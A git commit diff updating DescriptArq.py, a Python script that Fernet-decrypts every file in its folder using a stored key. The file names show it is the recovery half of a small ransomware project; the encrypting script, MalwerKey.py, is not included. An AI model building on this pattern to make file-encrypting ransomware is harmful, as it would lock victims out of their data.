e77469e54c08e5f93854824caada98df88c7be86
𝕵𝖕 𝕱𝖎𝖓𝖆𝖑𝕭𝖔𝖘𝖘 愛 <joao04pedro2006@gmail.com>
2024-10-21 07:04:59 -0300

    Update DescriptArq.py

--- DescriptArq.py
+++ DescriptArq.py
@@ -1,27 +1,27 @@
-from importlib.resources import contents
-import os 
+import os
 from cryptography.fernet import Fernet
-
 
 arquivos = []
 
-key = Fernet.generate_key()
+# Carrega a chave secreta do arquivo
+with open('chave.key', 'rb') as chave_file:
+    secretkey = chave_file.read()
 
-
-with open('chave.key' , 'rb') as key:
-    secretkey = key.read()
-
-
+# Coleta todos os arquivos no diretório atual, exceto os especificados
 for file in os.listdir():
-    if file == 'MalwerKey.py' or file == 'chave.key' or file == 'DescriptArq.py':
+    if file in {'MalwerKey.py', 'chave.key', 'DescriptArq.py'}:
         continue
     if os.path.isfile(file):
         arquivos.append(file)
 
-
+# Descriptografa cada arquivo coletado
 for file in arquivos:
-    with open(file, 'rb') as arquivo:
-        conteudo = arquivo.read()
-    conteudo_dencrypted = Fernet(secretkey).decrypt(conteudo)
-    with open(file, 'wb') as arquivo:
-        arquivo.write(conteudo_dencrypted)
+    try:
+        with open(file, 'rb') as arquivo:
+            conteudo = arquivo.read()
+        conteudo_decrypted = Fernet(secretkey).decrypt(conteudo)
+        with open(file, 'wb') as arquivo:
+            arquivo.write(conteudo_decrypted)
+        print(f"Arquivo {file} descriptografado com sucesso.")
+    except Exception as e:
+        print(f"Erro ao descriptografar o arquivo {file}: {e}")
